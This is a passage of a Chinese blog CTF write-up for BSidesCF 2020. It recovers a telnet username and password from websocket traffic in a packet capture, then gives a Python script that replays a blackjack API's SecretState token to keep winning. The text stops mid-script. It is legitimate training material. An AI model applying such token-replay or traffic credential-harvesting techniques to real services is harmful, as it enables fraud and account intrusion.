@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="[BSidesCF 2020]Bulls23先搞下来，解压发现是个html 本地搞个html网页来加载发现可以登录 发现第一个链接就是 1http:&#x2F;&#x2F;bash.org&#x2F;?random  找到是websocket流量 发现第二个链接 1http:&#x2F;&#x2F;n-gate.com  中途发现端口是8888 但还是不懂，说的要追踪TCP流量,那就追踪 1tcp.stream eq 363  然后随便选一条，导">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bsidescf2020">
+<meta property="og:url" content="https://baozongwi.xyz/posts/9c78d50f.html">
+<meta property="og:site_name" content="baozongwi:H@cking Th3 Fu1ure">
+<meta property="og:description" content="[BSidesCF 2020]Bulls23先搞下来，解压发现是个html 本地搞个html网页来加载发现可以登录 发现第一个链接就是 1http:&#x2F;&#x2F;bash.org&#x2F;?random  找到是websocket流量 发现第二个链接 1http:&#x2F;&#x2F;n-gate.com  中途发现端口是8888 但还是不懂，说的要追踪TCP流量,那就追踪 1tcp.stream eq 363  然后随便选一条，导">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieves/BSidesCF2020/QQ20240821-195824.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieves/BSidesCF2020/QQ20240821-201210.png">
+<meta property="article:published_time" content="2024-08-21T07:56:14.000Z">
+<meta property="article:modified_time" content="2025-07-13T10:31:48.057Z">
+<meta property="article:author" content="baozongwi">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="流量分析">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://baozongwi.xyz/images/achieves/BSidesCF2020/QQ20240821-195824.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/acvtar.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/acvtar.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/acvtar.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>bsidescf2020</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="baozongwi:H@cking Th3 Fu1ure" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+	<!-- Waline Comments -->
+	
+		<link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css"/>
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">H0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">Aβout</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Topi3s</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Cat4gory</a></li><!--
+     --><!--
+       --><li><a href="/links/">Li^ks</a></li><!--
+     --><!--
+       --><li><a href="/search/">Seαrch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/posts/42e3347e.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/aeb9bfb6.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://baozongwi.xyz/posts/9c78d50f.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://baozongwi.xyz/posts/9c78d50f.html&text=bsidescf2020"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://baozongwi.xyz/posts/9c78d50f.html&title=bsidescf2020"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://baozongwi.xyz/posts/9c78d50f.html&is_video=false&description=bsidescf2020"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=bsidescf2020&body=Check out this article: https://baozongwi.xyz/posts/9c78d50f.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://baozongwi.xyz/posts/9c78d50f.html&title=bsidescf2020"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://baozongwi.xyz/posts/9c78d50f.html&title=bsidescf2020"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://baozongwi.xyz/posts/9c78d50f.html&title=bsidescf2020"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://baozongwi.xyz/posts/9c78d50f.html&title=bsidescf2020"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://baozongwi.xyz/posts/9c78d50f.html&name=bsidescf2020&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://baozongwi.xyz/posts/9c78d50f.html&t=bsidescf2020"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BSidesCF-2020-Bulls23"><span class="toc-number">1.</span> <span class="toc-text">[BSidesCF 2020]Bulls23</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BSidesCF-2020-Cards"><span class="toc-number">2.</span> <span class="toc-text">[BSidesCF 2020]Cards</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BSidesCF-2020-Hurdles"><span class="toc-number">3.</span> <span class="toc-text">[BSidesCF 2020]Hurdles</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BSidesCF-2020-Had-a-bad-day"><span class="toc-number">4.</span> <span class="toc-text">[BSidesCF 2020]Had a bad day</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        bsidescf2020
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">baozongwi</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-08-21T07:56:14.000Z" class="dt-published" itemprop="datePublished">2024-08-21</time>
+        
+        (Updated: <time datetime="2025-07-13T10:31:48.057Z" class="dt-updated" itemprop="dateModified">2025-07-13</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%A4%8D%E7%8E%B0/">复现</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/php/" rel="tag">php</a>, <a class="p-category" href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="tag">流量分析</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="BSidesCF-2020-Bulls23"><a href="#BSidesCF-2020-Bulls23" class="headerlink" title="[BSidesCF 2020]Bulls23"></a>[BSidesCF 2020]Bulls23</h1><p>先搞下来，解压发现是个<code>html</code></p>
+<p>本地搞个<code>html</code>网页来加载发现可以登录</p>
+<p>发现第一个链接就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bash.org/?random</span><br></pre></td></tr></table></figure>
+
+<p>找到是<code>websocket</code>流量</p>
+<p>发现第二个链接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://n-gate.com</span><br></pre></td></tr></table></figure>
+
+<p>中途发现端口是<code>8888</code></p>
+<p>但还是不懂，说的要追踪<code>TCP</code>流量,那就追踪</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp.stream eq 363</span><br></pre></td></tr></table></figure>
+
+<p>然后随便选一条，导个<code>http</code>流量来看数据包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: bulls-23-047e34a4.challenges.bsidessf.net:8888</span><br><span class="line">Connection: Upgrade</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</span><br><span class="line">Upgrade: websocket</span><br><span class="line">Origin: http://bulls-23-047e34a4.challenges.bsidessf.net</span><br><span class="line">Sec-WebSocket-Version: 13</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Sec-WebSocket-Key: BPt0gjw53Um/3wwGRobU3w==</span><br><span class="line">Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits</span><br><span class="line"></span><br><span class="line">HTTP/1.1 101 Switching Protocols</span><br><span class="line">Upgrade: websocket</span><br><span class="line">Connection: Upgrade</span><br><span class="line">Sec-WebSocket-Accept: IRu2iJ6PyWj0BuG4Kme5KK3DEGE=</span><br></pre></td></tr></table></figure>
+
+<p>同时又找了一个追踪TCP流量也知道了密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: bulls-23-047e34a4.challenges.bsidessf.net:8888</span><br><span class="line">Connection: Upgrade</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</span><br><span class="line">Upgrade: websocket</span><br><span class="line">Origin: http://bulls-23-047e34a4.challenges.bsidessf.net</span><br><span class="line">Sec-WebSocket-Version: 13</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Sec-WebSocket-Key: BPt0gjw53Um/3wwGRobU3w==</span><br><span class="line">Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits</span><br><span class="line"></span><br><span class="line">HTTP/1.1 101 Switching Protocols</span><br><span class="line">Upgrade: websocket</span><br><span class="line">Connection: Upgrade</span><br><span class="line">Sec-WebSocket-Accept: IRu2iJ6PyWj0BuG4Kme5KK3DEGE=</span><br><span class="line"></span><br><span class="line">....... ..#..&#x27;..l.m...u&gt;...=O.................,....[....&amp;................!..?.ee.ef..... d.`.gD..........Kn.....g.o..Ubuntu 18.04.3 LTS</span><br><span class="line">..5dfa026515b6 login: .........m...Hxo...i...rm|...c......&#123;..h..3s..R..a..J.../..e....k....l...q..n..j.....r...o.....g...r..hO.....d..@.&#x27;.!..a.........n..k:l|a..</span><br><span class="line">.</span><br><span class="line">Password: ...X&amp;....4...V....S.4....G......&gt;...........J.6.z...</span><br><span class="line">............^j.$*.....&#x27;&#123;....7q..... 2.....#!...</span><br><span class="line">.BLast login: Sun Feb 16 06:44:05 UTC 2020 from localhost on pts/0</span><br><span class="line">. Welcome, the key is [REDACTED]</span><br><span class="line">.*This account is currently not available.</span><br><span class="line">....Target closed..N...M...&lt;a..ne..=c.</span><br></pre></td></tr></table></figure>
+
+<p>得到用户名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">michaeljordan</span><br></pre></td></tr></table></figure>
+
+<p>然后直接跟踪websocker流量就得到密码了<code>ib3atm0nstar5</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">..... ..#..&#x27;..... ..#..&#x27;..........VT100................!..............!............Ubuntu 18.04.3 LTS</span><br><span class="line">5dfa026515b6 login: mmiicchhaaeelljjoorrddaann</span><br><span class="line"></span><br><span class="line">Password: ib3atm0nstar5</span><br><span class="line"></span><br><span class="line">Last login: Sun Feb 16 06:44:05 UTC 2020 from localhost on pts/0</span><br><span class="line">Welcome, the key is [REDACTED]</span><br><span class="line">This account is currently not available.</span><br></pre></td></tr></table></figure>
+
+<p>看完流量包题目提供了一个页面链接一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node5.buuoj.cn 25947</span><br></pre></td></tr></table></figure>
+
+<p>但是流量包那个html很明显是不够的这里需要把环境导入一下</p>
+<p><code>index.html</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Telnet client using WebSockets<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;include/util.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;include/websock.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;include/webutil.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;include/keysym.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;include/VT100.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;include/wstelnet.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line">        <span class="comment">&lt;!-- Uncomment to activate firebug lite --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        &lt;script type=&#x27;text/javascript&#x27; </span></span><br><span class="line"><span class="comment">            src=&#x27;http://getfirebug.com/releases/lite/1.2/firebug-lite-compressed.js&#x27;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        Host: <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&#x27;host&#x27;</span> <span class="attr">style</span>=<span class="string">&#x27;width:100&#x27;</span>&gt;</span><span class="symbol">&amp;nbsp;</span></span><br><span class="line">        Port: <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&#x27;port&#x27;</span> <span class="attr">style</span>=<span class="string">&#x27;width:50&#x27;</span>&gt;</span><span class="symbol">&amp;nbsp;</span></span><br><span class="line">        Encrypt: <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&#x27;encrypt&#x27;</span> <span class="attr">type</span>=<span class="string">&#x27;checkbox&#x27;</span>&gt;</span><span class="symbol">&amp;nbsp;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&#x27;connectButton&#x27;</span> <span class="attr">type</span>=<span class="string">&#x27;button&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;Connect&#x27;</span> <span class="attr">style</span>=<span class="string">&#x27;width:100px&#x27;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">onclick</span>=<span class="string">&quot;connect();&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">pre</span> <span class="attr">id</span>=<span class="string">&quot;terminal&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> telnet;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">connect</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                telnet.<span class="title function_">connect</span>($D(<span class="string">&#x27;host&#x27;</span>).<span class="property">value</span>,</span></span><br><span class="line"><span class="language-javascript">                               $D(<span class="string">&#x27;port&#x27;</span>).<span class="property">value</span>,</span></span><br><span class="line"><span class="language-javascript">                               $D(<span class="string">&#x27;encrypt&#x27;</span>).<span class="property">checked</span>);</span></span><br><span class="line"><span class="language-javascript">                $D(<span class="string">&#x27;connectButton&#x27;</span>).<span class="property">disabled</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">                $D(<span class="string">&#x27;connectButton&#x27;</span>).<span class="property">value</span> = <span class="string">&quot;Connecting&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">disconnect</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                $D(<span class="string">&#x27;connectButton&#x27;</span>).<span class="property">disabled</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">                $D(<span class="string">&#x27;connectButton&#x27;</span>).<span class="property">value</span> = <span class="string">&quot;Disconnecting&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                telnet.<span class="title function_">disconnect</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">connected</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                $D(<span class="string">&#x27;connectButton&#x27;</span>).<span class="property">disabled</span> = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">                $D(<span class="string">&#x27;connectButton&#x27;</span>).<span class="property">value</span> = <span class="string">&quot;Disconnect&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                $D(<span class="string">&#x27;connectButton&#x27;</span>).<span class="property">onclick</span> = disconnect;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">disconnected</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                $D(<span class="string">&#x27;connectButton&#x27;</span>).<span class="property">disabled</span> = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">                $D(<span class="string">&#x27;connectButton&#x27;</span>).<span class="property">value</span> = <span class="string">&quot;Connect&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                $D(<span class="string">&#x27;connectButton&#x27;</span>).<span class="property">onclick</span> = connect;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;onload&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> url = <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>;</span></span><br><span class="line"><span class="language-javascript">                $D(<span class="string">&#x27;host&#x27;</span>).<span class="property">value</span> = (url.<span class="title function_">match</span>(<span class="regexp">/host=([^&amp;#]*)/</span>) || [<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>])[<span class="number">1</span>];</span></span><br><span class="line"><span class="language-javascript">                $D(<span class="string">&#x27;port&#x27;</span>).<span class="property">value</span> = (url.<span class="title function_">match</span>(<span class="regexp">/port=([^&amp;#]*)/</span>) || [<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>])[<span class="number">1</span>];</span></span><br><span class="line"><span class="language-javascript">                </span></span><br><span class="line"><span class="language-javascript">                telnet = <span class="title class_">Telnet</span>(<span class="string">&#x27;terminal&#x27;</span>, connected, disconnected);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其他的<code>js</code>去<code>GitHub</code>找吧，太多了</p>
+<p><img src="/../images/achieves/BSidesCF2020/QQ20240821-195824.png" alt="环境图"></p>
+<p>环境搭建好应该是这样的</p>
+<p>也就来回登录了七八遍吧,这个终端应该是那种只能用大键盘的，如果用小键盘输入的话不行，数字也必须用大键盘的</p>
+<p><img src="/../images/achieves/BSidesCF2020/QQ20240821-201210.png" alt="登录成功"></p>
+<p>欧克那么这道流量题也是过了，我之前是一道流量都不会看的也是了解了一下</p>
+<h1 id="BSidesCF-2020-Cards"><a href="#BSidesCF-2020-Cards" class="headerlink" title="[BSidesCF 2020]Cards"></a>[BSidesCF 2020]Cards</h1><p>是一个赌博系统</p>
+<p>抓包发现是由接口来判定操作的比如</p>
+<p><code>/api/deal</code>,<code>/api/stand</code></p>
+<p>观察包里面的<code>SecretState</code>是不一样的而且是随机的</p>
+<p>长度也有点不一样</p>
+<p>但是逐渐的抓包发现如果我们输了，这个<code>SecretState</code>是不会变的，但是赢了就会更新，那么下注之后要开牌的话，必须得用新的<code>SecretState</code>,但是下注之后分数已经扣了，可还是有输的状态</p>
+<blockquote>
+<p>利用21点中的一个规则，如果前两张牌已经是21点(black jack)，那么直接赢,直接省去开牌一直赢</p>
+</blockquote>
+<p>借用Y4师傅的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">start = <span class="string">&quot;http://f264fbfb-3b13-40b5-bce5-69afd17df237.node5.buuoj.cn:81/api&quot;</span></span><br><span class="line">deal = start + <span class="string">&quot;/deal&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开局</span></span><br><span class="line">state = requests.post(start).json()[<span class="string">&quot;SecretState&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 下注</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = requests.post(deal, json=&#123;<span class="string">&quot;Bet&quot;</span>: <span class="number">500</span>, <span class="string">&quot;SecretState&quot;</span>: state&#125;).json()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> resp[<span class="string">&#x27;GameState&#x27;</span>] == <span class="string">&#x27;Blackjack&#x27;</span>:</span><br><span class="line">        state = resp[<span class="string">&#x27;SecretState&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(resp[<span class="string">&#x27;Balance&#x27;</span>])</span><br><span class="line">    <span 